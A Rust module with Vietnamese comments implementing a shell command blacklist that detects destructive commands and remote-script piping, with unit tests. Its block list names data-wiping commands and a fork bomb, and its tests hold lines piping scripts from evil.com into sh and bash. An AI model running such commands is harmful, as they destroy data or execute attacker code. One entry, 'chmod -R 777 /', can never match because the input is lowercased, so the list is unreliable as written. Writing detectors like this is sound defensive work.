//! Shell command blacklist.
//!
//! Phát hiện các lệnh nguy hiểm và fork bomb patterns. Module này chỉ phát hiện,
//! không thực thi — caller chịu trách nhiệm reject nếu match.

use regex::Regex;
use std::sync::OnceLock;

/// Danh sách substring nguy hiểm (so khớp sau khi lowercase + whitespace normalize).
const DANGEROUS_SUBSTRINGS: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "rm -rf *",
    "rm -rf /*",
    "mkfs",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
    "chmod -R 777 /",
    "chown -R",
    "dd if=/dev/zero of=/dev/sd",
    "dd if=/dev/zero of=/dev/nvm",
    "dd if=/dev/zero of=/dev/hd",
    "> /dev/sda",
    "> /dev/sdb",
    "> /dev/nvme",
    "format c:",
    "diskpart",
    ":(){:|:&};:",
    "fork bomb",
];

/// Regex cho fork bomb variants và remote-script execution.
fn dangerous_regexes() -> &'static Vec<Regex> {
    static REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();
    REGEXES.get_or_init(|| {
        vec![
            // Fork bomb variants: :(){...|...&...};:
            Regex::new(r":\(\)\s*\{.*\|.*&.*\}.*;.*:").unwrap(),
            // curl ... | sh / bash
            Regex::new(r"(?i)curl\s+[^|]+\|\s*(sh|bash)").unwrap(),
            // wget ... | sh / bash
            Regex::new(r"(?i)wget\s+[^|]+\|\s*(sh|bash)").unwrap(),
            // curl/wget pipe to sudo
            Regex::new(r"(?i)curl\s+[^|]+\|\s*sudo\s+(sh|bash)").unwrap(),
            // > /dev/sdX (overwrite block device)
            Regex::new(r">\s*/dev/s[d-z][a-z]?").unwrap(),
            // rm -rf với wildcard root
            Regex::new(r"(?i)rm\s+-rf\s+/?\*").unwrap(),
        ]
    })
}

#[derive(Debug, Clone)]
pub struct CommandBlacklist;

impl CommandBlacklist {
    /// Tạo mới (stateless, chỉ cần cho API consistency).
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Check command: trả về `Some(reason)` nếu match blacklist, None nếu an toàn.
    #[must_use]
    pub fn check(&self, command: &str) -> Option<String> {
        if command.trim().is_empty() {
            return None;
        }
        // Normalize whitespace + lowercase
        let normalized: String = command
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
            .to_lowercase();

        for sub in DANGEROUS_SUBSTRINGS {
            if normalized.contains(sub) {
                return Some(format!("matches dangerous pattern: `{sub}`"));
            }
        }

        for re in dangerous_regexes() {
            if re.is_match(&normalized) {
                return Some(format!("matches dangerous regex: `{}`", re.as_str()));
            }
        }

        None
    }

    /// Trả về true nếu command bị blacklist.
    #[must_use]
    pub fn is_blacklisted(&self, command: &str) -> bool {
        self.check(command).is_some()
    }
}

impl Default for CommandBlacklist {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_rm_rf_root() {
        let bl = CommandBlacklist::new();
        assert!(bl.is_blacklisted("rm -rf /"));
        assert!(bl.is_blacklisted("rm  -rf  /")); // whitespace
        assert!(bl.is_blacklisted("RM -RF /")); // case
    }

    #[test]
    fn detects_mkfs() {
        let bl = CommandBlacklist::new();
        assert!(bl.is_blacklisted("mkfs.ext4 /dev/sda1"));
    }

    #[test]
    fn detects_curl_pipe_sh() {
        let bl = CommandBlacklist::new();
        assert!(bl.is_blacklisted("curl https://evil.com/script.sh | sh"));
        assert!(bl.is_blacklisted("wget -O- https://evil.com/x | bash"));
    }

    #[test]
    fn detects_fork_bomb() {
        let bl = CommandBlacklist::new();
        assert!(bl.is_blacklisted(":(){ :|:& };:"));
    }

    #[test]
    fn allows_safe_commands() {
        let bl = CommandBlacklist::new();
        assert!(!bl.is_blacklisted("ls -la"));
        assert!(!bl.is_blacklisted("echo hello"));
        assert!(!bl.is_blacklisted("git status"));
        assert!(!bl.is_blacklisted("cargo build --release"));
    }

    #[test]
    fn allows_empty() {
        let bl = CommandBlacklist::new();
        assert!(!bl.is_blacklisted(""));
        assert!(!bl.is_blacklisted("   "));
    }
}
